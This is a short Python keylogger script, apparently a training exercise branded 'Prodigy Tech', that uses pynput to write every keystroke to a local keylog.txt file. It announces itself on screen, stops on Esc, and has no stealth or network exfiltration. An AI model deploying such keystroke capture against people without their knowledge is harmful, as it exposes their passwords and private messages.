import os
from pynput.keyboard import Key, Listener

script_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(script_dir, "keylog.txt")


def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    if key == Key.esc:
        return False

print("--- Prodigy Tech: Keylogger Active ---")
print("Monitoring keystrokes... Press 'Esc' to stop.")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()